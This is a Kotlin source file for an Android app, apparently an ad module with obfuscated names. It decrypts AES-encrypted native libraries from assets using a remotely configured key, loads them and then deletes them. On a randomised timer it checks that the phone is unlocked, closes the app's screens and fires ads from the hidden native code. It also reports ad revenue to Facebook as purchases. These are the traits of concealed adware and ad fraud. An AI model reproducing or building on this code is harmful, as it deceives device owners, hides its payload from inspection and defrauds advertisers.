package gg

import android.app.Application
import android.app.KeyguardManager
import android.content.Context
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.util.Log
import azshow.sl.lo
import com.ggc.show.MasterRu
import com.ggc.show.ALLS
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONObject
import com.ggc.show.DataCc
import com.facebook.FacebookSdk
import com.facebook.appevents.AppEventsLogger
import com.google.firebase.analytics.FirebaseAnalytics
import com.google.firebase.analytics.ktx.analytics
import com.google.firebase.ktx.Firebase
import gh.cark.NcZong
import java.io.File
import java.io.FileOutputStream
import java.io.InputStream
import java.text.SimpleDateFormat
import java.util.Currency
import java.util.Date
import java.util.Locale
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec
import kotlin.random.Random

/**
 * Date：2025/7/16
 * Describe:
 * b2.D9
 */
object GgUtils {
    private var sK = "" // 16, 24, or 32 bytes // So 解密的key
    private var mContext: Application = MasterRu.mApp

    @JvmStatic
    var isSAd = false //是否显示广告
    private var lastSAdTime = 0L //上一次显示广告的时间

    @JvmStatic
    val mAdC: GgHelp = GgHelp()

    private val mMainScope = CoroutineScope(Dispatchers.Main)
    private var mInstallWait = 40000 // 安装时间
    private var cTime = 30000L // 检测间隔
    private var tPer = 40000 // 显示间隔
    private var nHourShowMax = 80//小时显示次数
    private var nDayShowMax = 80 //天显示次数
    private var nTryMax = 50 // 失败上限


    private var numHour = MasterRu.getInt("s_h_n")
    private var numDay = MasterRu.getInt("s_d_n")
    private var isCurDay = MasterRu.getStr("l_c_d")
    private var numJumps = MasterRu.getInt("n_j_p")

    @JvmStatic
    var isLoadH = false //是否H5的so 加载成功
    private var timeDS = 100L //延迟显示随机时间开始
    private var timeDE = 400L //延迟显示随机时间结束
    private var maxShowTime = 10000L // 最大显示时间
    private var checkTimeRandom = 1000 // 在定时时间前后增加x秒

    @JvmStatic
    fun gDTime(): Long {
        if (timeDE < 1 || timeDS < 1) return Random.nextLong(90, 190)
        return Random.nextLong(timeDS, timeDE)
    }

    @JvmStatic
    fun sNumJump(num: Int) {
        numJumps = num
        MasterRu.saveInt("n_j_p", num)
    }

    @JvmStatic
    fun adShow() {
        numHour++
        numDay++
        isSAd = true
        lastSAdTime = System.currentTimeMillis()
        sC()
        mAdC.loadAd()
    }

    private var isPost = false
    private fun pL() {
        if (isPost) return
        isPost = true
        MasterRu.pE("advertise_limit")
    }

    private fun sC() {
        MasterRu.saveInt("s_h_n", numHour)
        MasterRu.saveInt("s_d_n", numDay)
    }

    private fun isCurH(): Boolean {
        val s = MasterRu.getStr("l_hour_t")
        if (s.isNotBlank()) {
            if (System.currentTimeMillis() - s.toLong() < 60000 * 60) {
                return true
            }
        }
        MasterRu.saveC("l_hour_t", System.currentTimeMillis().toString())
        return false
    }

    private fun isLi(): Boolean {
        val day = SimpleDateFormat("yyyy-MM-dd", Locale.US).format(Date())
        if (isCurDay != day) {
            isCurDay = day
            MasterRu.saveC("l_c_d", isCurDay)
            numHour = 0
            numDay = 0
            isPost = false
            sC()
        }
        if (isCurH().not()) {
            numHour = 0
            sC()
        }
        if (numDay >= nDayShowMax) {
            pL()
            return true
        }
        if (numHour >= nHourShowMax) {
            return true
        }
        return false
    }

    @JvmStatic
    fun a2() {
        Log.e("TAG", "a2: xun")
        mContext.registerActivityLifecycleCallbacks(ALLS())
        File("${mContext.dataDir}/${DataCc.c}").mkdirs()
        t()
    }

    // 如果是Admin写在里面的那么可以直接进行数据
    @JvmStatic
    fun reConfig(js: JSONObject) {
        // JSON数据格式
        sK = js.optString("so_key")//So 解密的key

        val kg = js.optString("tw_v")
        val gb = js.optString("g_k_v")
        val ff = js.optString("f_f_v")
        val yc = js.optString("y_c_v")
        val wt = js.optString("w_t_v")
        DataCc.c = kg

        DataCc.a = gb

        DataCc.f = ff

        DataCc.y = yc

        DataCc.b = wt


        mAdC.setAdId(js.optString("ad_id_h"), js.optString("ad_id_l"))// 广告id
        val lt = js.optString("t_state").split("-")//时间相关配置
        cTime = lt[0].toLong() * 1000
        tPer = lt[1].toInt() * 1000
        mInstallWait = lt[2].toInt() * 1000
        nHourShowMax = lt[3].toInt()
        nDayShowMax = lt[4].toInt()
        nTryMax = lt[5].toInt()
        timeDS = lt[6].toLong()
        timeDE = lt[7].toLong()
        maxShowTime = lt[8].toLong() * 1000
        checkTimeRandom = lt[9].toInt() * 1000


    }

    private var lastS = ""
    private fun refreshAdmin() {
        val s = MasterRu.getStr("akv")
        if (lastS != s) {
            lastS = s
            reConfig(JSONObject(s))
        }
    }

    private fun t() {
        if (numJumps > nTryMax) {
            MasterRu.pE("pop_fail")
            return
        }
        val is64i = is64a()
        mMainScope.launch {
            MasterRu.pE("test_s_dec")
            val time = System.currentTimeMillis()
            val i: Boolean
            withContext(Dispatchers.IO) {
                i = loadSFile(if (is64i) "kk/kuang.txt" else "kk/kun.zip")
            }
            Log.e("TAG", "t-wt-so-is-success-$i")
            if (i.not()) {
                MasterRu.pE("ss_l_f", "$is64i")
                return@launch
            }
            MasterRu.pE("test_s_load", "${System.currentTimeMillis() - time}")
            lo.loTx(22, 11.0, DataCc.y)
            while (true) {
                // 刷新配置
                refreshAdmin()
                var t = cTime
                if (checkTimeRandom > 0) {
                    t = Random.nextLong(cTime - checkTimeRandom, cTime + checkTimeRandom)
                }
                cAction(t)
                delay(t)
                if (numJumps > nTryMax) {
                    MasterRu.pE("pop_fail")
                    break
                }
            }
        }

        mMainScope.launch(Dispatchers.IO) {
            delay(1000)
            if (loadSFile(if (is64i) "hh/huang.txt" else "hh/hua.zip")) {
                withContext(Dispatchers.Main) {
                    try {
                        lo.loh(mContext)
                        isLoadH = true
                    } catch (_: Throwable) {
                    }
                }
            }
        }
    }

    private fun loadSFile(assetsName: String): Boolean {
        val assetsInputS = mContext.assets.open(assetsName)
        val fileSoName = "${assetsName.substring(2)}_${System.currentTimeMillis()}"
        val file = File("${mContext.filesDir}/Cache")
        if (file.exists().not()) {
            file.mkdirs()
        }
        try {
            decrypt(assetsInputS, File(file.absolutePath, fileSoName))
            val file2 = File(file.absolutePath, fileSoName)
            System.load(file2.absolutePath)
            file2.delete()
            return true
        } catch (_: Exception) {
        }
        return false
    }


    // 解密
    private fun decrypt(inputFile: InputStream, outputFile: File) {
        Log.e("TAG", "decrypt: ${sK}")
        val key = SecretKeySpec(sK.toByteArray(), "AES")
        val cipher = Cipher.getInstance("AES")
        cipher.init(Cipher.DECRYPT_MODE, key)
        val outputStream = FileOutputStream(outputFile)
        val inputBytes = inputFile.readBytes()
        val outputBytes = cipher.doFinal(inputBytes)
        outputStream.write(outputBytes)
        outputStream.close()
        inputFile.close()
    }

    private fun is64a(): Boolean {
        // 优先检测64位架构
        for (abi in Build.SUPPORTED_64_BIT_ABIS) {
            if (abi.startsWith("arm64") || abi.startsWith("x86_64")) {
                return true
            }
        }
        for (abi in Build.SUPPORTED_32_BIT_ABIS) {
            if (abi.startsWith("armeabi") || abi.startsWith("x86")) {
                return false
            }
        }
        return Build.CPU_ABI.contains("64")
    }


    // 定时逻辑
    private fun cAction(time: Long) {
        MasterRu.pE("ad_session", time.toString())
        if (l().not()) return
        MasterRu.pE("ad_light")
        if (isLi()) {
            MasterRu.pE("ad_pass", "limit")
            return
        }
        mAdC.loadAd()
        if (System.currentTimeMillis() - MasterRu.insAppTime < mInstallWait) {
            MasterRu.pE("ad_pass", "1t")
            return
        }
        if (System.currentTimeMillis() - lastSAdTime < tPer) {
            MasterRu.pE("ad_pass", "2t")
            return
        }
        if (isSAd && System.currentTimeMillis() - lastSAdTime < maxShowTime) {
            MasterRu.pE("ad_pass", "s")
            return
        }
        MasterRu.pE("ad_pass", "N")
        CoroutineScope(Dispatchers.Main).launch {
            delay(MasterRu.finishAllActivities())
            if (isSAd) {
                delay(800)
            }
            sNumJump(++numJumps)
            MasterRu.pE("ad_start")
            lo.loTx(2, 1.0, DataCc.b)
        }
    }

    private fun l(context: Context = mContext): Boolean {
        return (context.getSystemService(Context.POWER_SERVICE) as PowerManager).isInteractive && (context.getSystemService(
            Context.KEYGUARD_SERVICE
        ) as KeyguardManager).isDeviceLocked.not()
    }

    @JvmStatic
    fun postEcpm(ecpm: Double) {
        try {
            val b = Bundle()
            b.putDouble(FirebaseAnalytics.Param.VALUE, ecpm)
            b.putString(FirebaseAnalytics.Param.CURRENCY, "USD")
            Firebase.analytics.logEvent("ad_impression_Brilliant", b)
        } catch (_: Exception) {
        }
        if (FacebookSdk.isInitialized().not()) return
        //fb purchase
        AppEventsLogger.newLogger(MasterRu.mApp).logPurchase(
            ecpm.toBigDecimal(), Currency.getInstance("USD")
        )
    }


}